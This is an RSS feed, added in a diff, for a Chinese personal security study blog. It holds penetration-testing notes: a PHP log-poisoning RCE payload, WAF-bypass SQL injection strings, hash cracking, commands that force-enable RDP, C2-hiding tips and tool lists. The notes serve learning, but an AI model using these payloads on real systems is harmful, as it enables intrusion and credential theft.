@@ -1,0 +1,362 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Study_books on Olist.213</title>
+    <link>https://olist213.github.io/study_book/</link>
+    <description>Recent content in Study_books on Olist.213</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Sat, 05 Jun 2021 15:52:32 +0800</lastBuildDate><atom:link href="https://olist213.github.io/study_book/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Time 2021 06 05 mac os软件安装</title>
+      <link>https://olist213.github.io/study_book/time-2021-06-05/</link>
+      <pubDate>Sat, 05 Jun 2021 15:52:32 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-06-05/</guid>
+      <description>mac os软件安装  notion onedrive spotify office 365 微信 google浏览器 Clashx for mac telegram 无法开启代理 clashx idm 使用folx替换 git firefox vscode zy player fluent reader bandizip 收费 copytranslater typora steam mybase 百度网盘 wgestures betterandbetter dbeaver finalshell snapeste motrix docker parallels desktop folx clearmymac xmind zen ssr telegram desktop antsword wireshark 010 editor touchbar-systemmonitor  A better simple reactive system monitor on macOS for your MacBook pro. Built with Electron.    </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 20 Docker Install Nessus</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-20-docker-install-nessus/</link>
+      <pubDate>Thu, 20 May 2021 12:53:03 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-20-docker-install-nessus/</guid>
+      <description># 拉取镜像 docker pull leishianquan/awvs-nessus:v4 # 启动 docker run --name awvs-nessus -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v4 # 查看容器 docker ps –a # 启动容器 docker start container-id # 进入容器 docker exec –it container-id /bin/bash # 进入容器后，启动nessus /etc/init.d/nessusd start # 访问扫描器地址和账号密码 Nessus: https://127.0.0.1:8834/#/ account:leishi/leishianquan Awvs13: https://127.0.0.1:13443/ account:admin@admin.com/Admin123 #上传插件 docker cp all-2.0-20210510.tar.gz container-id:/ #更新插件 &amp;gt;/etc/init.d/nessusd stop &amp;gt;/opt/nessus/sbin/nessuscli update /root/Downloads/all-2.0.tar.gz &amp;gt;/etc/init.d/nessusd start Test all the hosts via @pdiscoveryio httpx tool:- httpx -l hosts.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 16</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-16/</link>
+      <pubDate>Sun, 16 May 2021 18:49:11 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-16/</guid>
+      <description>RCE via Apache logs  Poison the User-Agent in access logs: $ curl &amp;lt;http://example.org/&amp;gt; -A &amp;#34;&amp;lt;?php system(\\$_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;#34; Note: The logs will escape double quotes so use single quotes for strings in the PHP payload. Then request the logs via the LFI and execute your command. $ curl &amp;lt;http://example.org/test.php?page=/var/log/apache2/access.log&amp;amp;cmd=id&amp;gt;   windows_baseline
+ windows基线脚本（powershell）    emergency-response-checklist
+ 应急响应指南    GET /page.php?path=../../etc/passwd Forbidden 403 ? Try One Of These: (1).</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 15 httpx naabu subfinder</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-15/</link>
+      <pubDate>Sat, 15 May 2021 11:54:25 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-15/</guid>
+      <description> fluent-reader naabu  docker pull projectdiscovery/naabu docker run -it projectdiscovery/naabu -host hackerone.com &amp;gt; hackerone.com.txt  subfinder  subfinder -d example.com echo hackerone.com | subfinder -silent | httpx -silent  httpx  httpx -l hosts.txt -silent echo 173.0.84.0/24 | httpx -silent subfinder -d hackerone.com | httpx -title -tech-detect -status-code -title -follow-redirects  notify  </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 14</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-14/</link>
+      <pubDate>Fri, 14 May 2021 12:29:54 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-14/</guid>
+      <description>tmux
+  How to navigate directories faster with bash
+ cd别名设置  alias ..=&amp;#34;cd ..&amp;#34; alias ...=&amp;#34;cd ../..&amp;#34; alias ....=&amp;#34;cd ../../..&amp;#34; alias .....=&amp;#34;cd ../../../..&amp;#34; alias ......=&amp;#34;cd ../../../../..&amp;#34; alias .......=&amp;#34;cd ../../../../../..&amp;#34; alias ........=&amp;#34;cd ../../../../../../..&amp;#34; alias .........=&amp;#34;cd ../../../../../../../..&amp;#34; alias ..........=&amp;#34;cd ../../../../../../../../..&amp;#34; alias ...........=&amp;#34;cd ../../../../../../../../../..&amp;#34; alias ............=&amp;#34;cd ../../../../../../../../../../..&amp;#34; alias .............=&amp;#34;cd ../../../../../../../../../../../..&amp;#34;   !$
+ 前一个命令最后一个参数的别名，如下面这个命令就是等价于cd make/new/directory  mkdir -p make/new/directory cd !$     OneListForAll
+  ffuf -c -w onelistforall.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 12 RapidDns Domain</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-12/</link>
+      <pubDate>Wed, 12 May 2021 15:07:01 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-12/</guid>
+      <description> RapidDns 在线域名批量解析ip地址查询  curl -s &amp;#34;&amp;lt;https://rapiddns.io/subdomain/jxuspt.com?full=1#result&amp;gt;&amp;#34; | grep &amp;#34;&amp;lt;td&amp;gt;&amp;lt;a&amp;#34; | cut -d &amp;#34;/&amp;#34; -f3 | cut -d &amp;#39;&amp;#34;&amp;#39; -f1 | xargs -l2 | sed &amp;#39;s/#result//g&amp;#39; </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 11 Fofa</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-11-fofa/</link>
+      <pubDate>Tue, 11 May 2021 16:19:20 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-11-fofa/</guid>
+      <description>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索
+  title=&amp;ldquo;abc&amp;rdquo; 从标题中搜索abc。例：标题中有北京的网站
+  header=&amp;ldquo;abc&amp;rdquo; 从http头中搜索abc。例：jboss服务器
+  body=&amp;ldquo;abc&amp;rdquo; 从html正文中搜索abc。例：正文包含Hacked by
+  domain=&amp;ldquo;qq.com&amp;rdquo; 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站
+  host=&amp;quot;.gov.cn&amp;quot; 从url中搜索.gov.cn,注意搜索要用host作为名称。例： 政府网站, 教育网站
+  port=&amp;ldquo;443&amp;rdquo; 查找对应443端口的资产。例： 查找对应443端口的资产
+  ip=&amp;ldquo;1.1.1.1&amp;rdquo; 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。例： 查询IP为220.181.111.1的网站; 如果想要查询网段，可以是： ip=&amp;ldquo;220.181.111.1/24&amp;rdquo;，例如查询IP为220.181.111.1的C网段资产
+  protocol=&amp;ldquo;https&amp;rdquo; 搜索指定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产
+  city=&amp;ldquo;Hangzhou&amp;rdquo; 搜索指定城市的资产。例： 搜索指定城市的资产
+  region=&amp;ldquo;Zhejiang&amp;rdquo; 搜索指定行政区的资产。例： 搜索指定行政区的资产
+  Province=&amp;ldquo;Zhejiang&amp;rdquo;
+  country=&amp;ldquo;CN&amp;rdquo; 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产
+  cert=&amp;ldquo;google&amp;rdquo; 搜索证书(https或者imaps等)中带有google的资产。例： 搜索证书(https或者imaps等)中带有google的资产
+  banner=users &amp;amp;&amp;amp; protocol=ftp 搜索FTP协议中带有users文本的资产。例： 搜索FTP协议中带有users文本的资产</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 11</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-11/</link>
+      <pubDate>Tue, 11 May 2021 10:26:20 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-11/</guid>
+      <description>   渗透测试靶场
+ buuoj Vulhub webhacking.kr hackinglab.cn mozhe.cn  收费   安鸾渗透实战平台 xss-quiz.int21h MS08067 实战型训练平台  邀请码   东塔在线靶场 DVWA BWVS BWAPP sqli-lib Upload-labs Metasploitable Web for Pentester    ATT&amp;amp;CK 初探&amp;ndash;侦察阶段
+  </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 10</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-10/</link>
+      <pubDate>Mon, 10 May 2021 23:01:40 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-10/</guid>
+      <description>  Doge-AliveCheck  Use ICMP requests to check the alive subnet.   scf-proxy 2021护网公布漏洞清单   </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 09</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-09/</link>
+      <pubDate>Sun, 09 May 2021 09:37:48 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-09/</guid>
+      <description>  日常
+  打开google浏览器的稍后阅读功能
+  chrome://flags/#read-later           docker安装awvs14
+  docker pull vouu/acu1422 docker run -it -d -p 443:3443 vouu/acu1422 login: https://localhost Email: contact@manhtuong.net Password:Abcd1234      </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 08</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-08/</link>
+      <pubDate>Sat, 08 May 2021 16:31:02 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-08/</guid>
+      <description>pppXray
+  Xray批量化自动扫描
+  xray挂机刷漏洞
+  import hashlib import re import time import os import click import config import winsound @click.command() @click.option(&amp;#39;-r&amp;#39;, &amp;#39;--readfile&amp;#39;,default=&amp;#39;target.txt&amp;#39;,help=&amp;#39;xray批量扫描读取文件名,按行读取&amp;#39;,type=str) @click.option(&amp;#39;--plugins&amp;#39;,help=&amp;#39;自定义xray插件 plugins&amp;#39;) def init(readfile,plugins): &amp;#34;&amp;#34;&amp;#34;pppXray : xray 批量扫描\nhttps://github.com/Cl0udG0d/pppXray &amp;#34;&amp;#34;&amp;#34; try: if not os.path.exists(config.saveDir): os.makedirs(config.saveDir) config.targetFileName=readfile if plugins: config.plugins=plugins click.echo(&amp;#34;读取文件 {} &amp;#34;.format(readfile)) except Exception as e: print(e) pass def xrayScan(targeturl,outputfilename=&amp;#34;test&amp;#34;): scanCommand = &amp;#34;xray_windows_amd64.exe webscan {} --basic-crawler {} --html-output {}\\{}.html&amp;#34;.format(&amp;#39;--plugins {}&amp;#39;.format(config.plugins) if config.plugins else &amp;#39;&amp;#39;,targeturl, config.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 06</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-06/</link>
+      <pubDate>Thu, 06 May 2021 09:29:25 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-06/</guid>
+      <description>   绕过360创建用户登陆内网3389实战记录
+  【编程】创建用户，并添加至管理组
+  NautilusProject
+ Weird Ways to Run Unmanaged Code in .NET    Windows10子系统(WSL)修改安装目录
+  grep.app
+  </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 05</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-05/</link>
+      <pubDate>Wed, 05 May 2021 10:06:48 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-05/</guid>
+      <description>免杀
+ Go_Bypass    在线编译器
+  tmux
+  netsh实现端口转发
+  ssh端口转发
+  BloodHound
+  安装运行服务
+  apt install bloodhound neo4j console     启动BloodHound GUI
+  bloodhound     安装数据采集器
+  pip3 install bloodhound     从域中提取数据
+  bloodhound-python -u administer -p Ignite@987 -ns 192.168.1.172 -d ignite.local -c All     导入数据</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 05 04</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-04/</link>
+      <pubDate>Tue, 04 May 2021 10:21:54 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-04/</guid>
+      <description>扫大佬blog
+  春告鳥
+  SQL注入及bypass思路（3）
+  探索and
+  ?id=1 and ord(&amp;#34;a&amp;#34;)-96 ?id=1 and ord(&amp;#34;a&amp;#34;)-97     探索 union select
+  内联注释绕过
+  union 不拦截 select 不拦截 union select 拦截 union 各种字符 select 拦截 union%20%a0select 拦截 union/*select*/ 不拦截   /*!/*!*/ # 不拦截 /*!union/*/*/*%00select*/%201,2,3--+     注释绕过
+  union %23%0aselect 拦截 union %23select 拦截 union a%23 select 拦截 union all%23 select 拦截 union all%23%0a select 拦截 union %23%0aall select 拦截 # 不拦截 union%20%23%0aall%20/!</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 30</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-30/</link>
+      <pubDate>Fri, 30 Apr 2021 01:19:07 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-30/</guid>
+      <description> 后渗透 </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 29 Ctf</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-29-ctf/</link>
+      <pubDate>Thu, 29 Apr 2021 09:38:47 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-29-ctf/</guid>
+      <description>大型赛事Writeup
+ 赛事安排  ctftime i春秋      部委&amp;amp;公安&amp;amp;网信
+ CNAS  2018  2018年CNAS网络安全等级保护测评能力验证与攻防大赛writeup  1、burp加载字典,延迟2000ms暴力破解 2、越权uid=1 3、sql盲注,apk接口泄露 4、宽字节注入 - %df%27 5、weblogic写入shell 6、jwt token伪造 7、修改UA、XFF头,SSRF漏洞file读取flag 8、ptf后缀文件上传   2017年CNAS网络安全等级保护测评能力验证与攻防大赛部分题目writeup  JPK 编码解码工具    cnas能力验证攻防比赛writeup      ISG  2018  ISG 2018 Web Writeup     虎符杯  2020  虎符杯两道NodeJS题目的分析 数字中国创新大赛-虎符网络安全赛道Write up 虎符 CTF Web 部分 Writeup     强网杯  2019  2019 第三届强网杯 Web 部分 WriteUp + 复现环境  qwb_2019_supersqli   强网杯Web部分writeup   2019 广东强网杯  2019广东强网杯Writeup(MISC)   2019 强网杯拟态挑战赛  MIMIC Defense CTF 2019 final writeup     网鼎杯  2020  青龙组  2020网鼎杯青龙组部分wp 2020网鼎杯第一场Crypto题解 网鼎杯2020青龙组 web writeup 网鼎杯 2020 Web Writeup 2020-网鼎杯(青龙组)-Web题目-AreUserialz Writeup 网鼎杯-青龙组web题目writeup 2020网鼎杯青龙组_re_signal 2020网鼎杯 青龙组 Android逆向题 rev01 WP 2020-网鼎杯(青龙组)_Web题目 FileJava Writeup 2020年第二届“网鼎杯”-网络安全大赛青龙组writeup   白虎组  2020年第二届“网鼎杯”网络安全大赛 白虎组 部分题目Writeup 网鼎杯2020白虎组Reverse-py,恶龙,幸运的数字 WP 网鼎杯2020白虎组Crypto-rand,b64 WP 网鼎杯2020白虎组web-picdown,张三的网站,starbucket WP 网鼎杯2020白虎组misc-hidden,密码柜,boot WP 网鼎杯2020白虎组misc-hack WP [原创]网鼎杯2020 白虎组 【恶龙】 解题 网鼎杯CTF——白虎组 (week 4) [原创]网鼎杯2020 白虎组 CY 解题 网鼎杯白虎组部分题目复盘 网鼎杯2020白虎组Misc题目hidden总结 网鼎杯-白虎组web题目writeup 2020网鼎杯白虎组re 恶龙 wp   朱雀组  2020网鼎杯朱雀组云顿WP(入门向) 【网鼎杯2020朱雀组】Web WriteUp [re]go语言逆向：2020网鼎杯朱雀组re what wp 2020网鼎杯朱雀组_PHPweb 2020网鼎杯-朱雀组-部分wp 2020网鼎杯-朱雀组部分题目Writeup 2020网鼎杯-朱雀组-Crypto、Misc(带视频) 2020网鼎杯朱雀组逆向2 tree   玄武组  网鼎杯2020-玄武组签到题 网鼎杯玄武组部分web题解 网鼎杯-玄武组-writeup-简单思路讲究 2020网鼎杯玄武组_babyvm 2020网鼎杯玄武组部分题writeup（签到/vulcrack/java/js_on） 2020网鼎杯-玄武组-部分WriteUp 【CTF】网鼎杯【玄武组】CTF部分题     2018  青龙组  【2018年 网鼎杯CTF 第一场】China H.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 28</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-28/</link>
+      <pubDate>Wed, 28 Apr 2021 21:52:43 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-28/</guid>
+      <description>hashcat
+  爆破NTLM-hash
+  hashcat -m 1000 hash.txt pass1.txt MODE: 1000 TYPE: NTLM b4b9b02e6f09a9bd760f388b67351e2b     爆破shadow文件
+  hash.txt 只保留加密的密码字段 : $id$salt$encrypted
+  hashcat -m 500 hash.txt pass1.txt hashcat -m 1500 hash.txt pass1.txt hashcat -m 1800 hash.txt pass1.txt MODE: 500 TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) 2 $1$28772684$iEwNOgGugqO9.bIz5sk8k/ MODE: 1500 TYPE: descrypt, DES (Unix), Traditional DES 48c/R8JAv757A MODE: 1800 TYPE: sha512crypt $6$, SHA512 (Unix) $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/     批量破解</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 27 Github Star</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-27-github-star/</link>
+      <pubDate>Tue, 27 Apr 2021 12:48:01 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-27-github-star/</guid>
+      <description>渗透环境
+ sqli-labs  SQLI labs to test error based, Blind boolean based, Time based.   vulhub  Pre-Built Vulnerable Environments Based on Docker-Compose   commando-vm upload-labs ptf juice-shop commix-testbed Viper  Viper (炫彩蛇) 图形化内网渗透工具   vulfocus dvta VulnHub  DC Serial  DC 系列靶场,难度简单至中等,可以学习各种提权和CMS漏洞利用,推荐初学者挑战   symfonos Serial  挺有难度的靶场,内容丰富,难度中等,漏洞利用内容很多,推荐有一定经验者挑战   Kioptrix Serial  Kioptrix 系列靶场,难度简单至中等,推荐初学者挑战        好用的软件</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 27</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-27/</link>
+      <pubDate>Tue, 27 Apr 2021 09:12:13 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-27/</guid>
+      <description>【防溯源】如何通过域名 + CDN 完美隐藏你的 C2
+  freenom.com 注册一个域名
+  注册cloudflare.com账号
+  cf http端口支持
+  80,8080,8880,2052,2082,2086,2095     cf https端口支持
+  443,2053,2083,2087,2096,8443       最新注册freenom免费域名的方法
+ 更换注册地 xxxx.tk搜索 注册成功    snmpwalk
+  #得到取得windows端的系统进程用户数等 snmpwalk -c public -v 1 -m ALL 192.168.30.49 .1.3.6.1.2.1.25.1 #取得系统总内存 snmpwalk -c public -v 1 -m ALL 192.168.30.49 .1.3.6.1.2.1.25.2.2 #取得IP信息 snmpwalk -c public -v 1 -m ALL 192.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 26</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-26/</link>
+      <pubDate>Mon, 26 Apr 2021 09:57:46 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-26/</guid>
+      <description>内网渗透-3389
+  查看远程桌面端口
+  #得到连接端口为 0xd3d，转换后为 3389 REG QUERY &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /V PortNumber     查看是否支持远程桌面连接
+  #1表示关闭，0表示开启 REG QUERY &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections       开启rdp
+  # 修改连接端口重启生效 REG ADD &amp;#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f   REG ADD &amp;ldquo;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;rdquo; /v PortNumber /t REG_DWORD /d 0x00000d3d /f
+   (强开3389)</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 25</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-25/</link>
+      <pubDate>Sun, 25 Apr 2021 09:17:27 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-25/</guid>
+      <description>red-team
+  木马查杀工具-火绒恶性木马专杀工具
+  Windows / Linux Local Privilege Escalation Workshop
+  404 StarLink Project 2.0 - Galaxy
+ Elkeid  Elkeid是一个云原生的基于主机的入侵检测解决方案。   linglong  一款甲方资产巡航扫描系统。系统定位是发现资产，进行端口爆破。   Glass  Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa/ZoomEye/Shodan/360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP/IP段或资产列表进行快速的指纹识别。   AppInfoScanner  一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。   redis-rogue-server HackBrowserData  hack-browser-data 是一个解密浏览器数据（密码|历史记录|Cookies|书签）的导出工具，支持全平台主流浏览器的数据导出窃取。   antSword  中国蚁剑是一款开源的跨平台网站管理工具.   ServerScan  一款使用Golang开发且适用于攻防演习内网横向信息收集的高并发网络扫描、服务探测工具。   fscan  一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。   As-Exploits  中国蚁剑后渗透框架      获取Windows高版本明文密码</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 22</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-22/</link>
+      <pubDate>Thu, 22 Apr 2021 09:41:28 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-22/</guid>
+      <description>  浏览器插件分享  Wappalyzer  Google Chrome &amp;amp; Mozilla Firefox   Shodan  google Chrome &amp;amp; Mozilla Firefox   proxy-switchyomega HTTP Header Live  Google Chrome &amp;amp; Mozilla Firefox   Mitaka  Google Chrome &amp;amp; Mozilla Firefox   HackBar  Google Chrome | Mozilla Firefox   JavaScript and CSS Code Beautifier User-Agent Switcher  Google Chrome | Mozilla Firefox   FOFA Pro View  fofa插件   HeaderEditor Hack-Tools antiHoneypot  一个拦截蜜罐XSSI的Chrome扩展      </description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 21</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-21-1/</link>
+      <pubDate>Wed, 21 Apr 2021 12:49:50 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-21-1/</guid>
+      <description>等保培训  安全管理技术要求  信息收集小脚本 #nmap扫描存活 nmap -sn 172.29.130.0/24 &amp;gt; nmap-ip.txt #获取nmap扫描存活的ip cat nmap-ip.txt | grep &amp;#34;repo&amp;#34; | cut -d &amp;#34; &amp;#34; -f6 | cut -d &amp;#34;(&amp;#34; -f2 | cut -d &amp;#34;)&amp;#34; -f1 &amp;gt; ip.txt #masscan扫描端口 sudo masscan -iL ip.txt --rate 10000 -p1-65535 --only-open #获取masscan扫描结果中的ip cat masscan-ip.txt | grep &amp;#34;tcp&amp;#34; | cut -d &amp;#34; &amp;#34; -f 4,6 | awk &amp;#39;{print $2,$1}&amp;#39;| tr &amp;#34; &amp;#34; &amp;#34;:&amp;#34; | cut -d &amp;#34;/&amp;#34; -f1 | cut -d &amp;#34;:&amp;#34; -f1 | sort -t &amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 20</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-21/</link>
+      <pubDate>Tue, 20 Apr 2021 09:10:48 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-21/</guid>
+      <description>等保培训  关键信息基础设施  PenTest-Tools 1、domainname 域名搜集工具
+2、webscan web扫描工具
+  3xp10it
+  AngelSword
+ Python3编写的CMS漏洞检测框架    AutoSploit
+ Automated Mass Exploiter(远程/外网)    AZScanner
+ 自动漏洞扫描器，自动子域名爆破，自动爬取注入，调用sqlmapapi检测注入，端口扫描，目录爆破，子网段服务探测及其端口扫描，常用框架漏洞检测。    BBScan
+ A fast vulnerability scanner    cansina
+ Web Content Discovery Tool    Fast_Scan
+ Quick and Dirty full-connect scanner. ./fastscan 192.169.1.1    FingerPrint
+  F-MiddlewareScan
+  实现针对中间件的自动化检测，端口探测-&amp;gt;中间件识别-&amp;gt;漏洞检测-&amp;gt;获取webshell</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 19</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-19/</link>
+      <pubDate>Mon, 19 Apr 2021 14:29:39 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-19/</guid>
+      <description>Windows平台运行Masscan和Nmap
+  前提：WinPcap
+  @echo off cd %~dp0 if &amp;#34;%PROCESSOR_ARCHITECTURE%&amp;#34;==&amp;#34;x86&amp;#34; move npf_x86.sys %SystemRoot%\system32\drivers\npf.sys if &amp;#34;%PROCESSOR_ARCHITECTURE%&amp;#34;==&amp;#34;AMD64&amp;#34; move npf_x64.sys %SystemRoot%\system32\drivers\npf.sys if exist %SystemRoot%\system32\drivers\npf.sys (echo move success!) else (echo move error!) sc create npf binPath= system32\drivers\npf.sys type= kernel start= demand error= normal tag= no DisplayName= &amp;#34;NetGroup Packet Filter Driver&amp;#34; sc start npf   https://github.com/3gstudent/Winpcap_Install
+    实例：vs2019编译masscan
+  windows平台内网常用信息收集工具
+  masscan
+  nmap</description>
+    </item>
+    
+    <item>
+      <title>Time 2021 04 18</title>
+      <link>https://olist213.github.io/study_book/time-2021-04-18/</link>
+      <pubDate>Sun, 18 Apr 2021 11:40:22 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-04-18/</guid>
+      <description>Cobalt Strike
+  Cobalt Strike Malleable C2设计和参考指南
+ 语法检测：./c2lint [/path/to/my.profile]    Random C2 Profile Generator
+  Cobalt Strike生成随机MalleableC2 Profile文件
+  setup
+  pip3 install -r requirements python random_c2profile.py     其他同类型项目
+ C2concealer      Malleable-C2-Profiles
+    实战
+  Cobalt Strike 团队服务器隐匿
+    条件：
+ 需要域名 机器C ssh远程端口转发 A和B分别为代理节点，将来自80的流量转发出去 Beacon弹回至机器A，最终本地机器E与机器A进行通信，监听器为foreign    红队基础建设:隐藏你的C2 server</description>
+    </item>
+    
+    <item>
+      <title>Time 2019 01 15</title>
+      <link>https://olist213.github.io/study_book/time-2019-01-15/</link>
+      <pubDate>Wed, 16 Jan 2019 13:18:20 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2019-01-15/</guid>
+      <description>银魂45集
+定春突然变大了，一开始，神乐、新八、银时不明白情况，都找不到解决办法。
+定春变大之后，邻居开始恐慌了，纷纷说要赶走定春，神乐守护着定春，神乐也被邻居扔石头砸了，定春看到神乐被打一幕，突然变得异常恐怖，开始丧失自己的理智，谁也拉不住，拼命逃窜。
+定春一开始是神子，后来神庙倒闭，巫女就把定春放在了银魂门口，当时被神乐捡了回去，神乐和定春的感情自不必多讲。
+在众人的拼命努力之下，通过五星阵终于把定春制伏了。
+最后一幕，银时看着电视，电视里放着的就是这一幕，银时说，真是无聊的节目，全是马赛克，其实在银时的内心，更多的是开心。
+最后也来了一句，不懂礼仪的人，可是没有资格养宠物的哦。
+在现实生活中，又不是如此呢？连基本的礼仪都不懂的人，如何能善待自己养的宠物呢，记得，李敖先生说过，如果你真的喜欢宠物，你就需要和宠物同喝一杯水，不然，就算不上喜欢。
+同样的，回到人的身上，不同负责的人，可是没有资格养孩子的哦。鲁迅先生说过，孩子降临人世，你就要对其负责，如果不想负责，就不要把孩子带来世界，生命是可贵的，不要白白浪费了一个生命。</description>
+    </item>
+    
+  </channel>
+</rss>
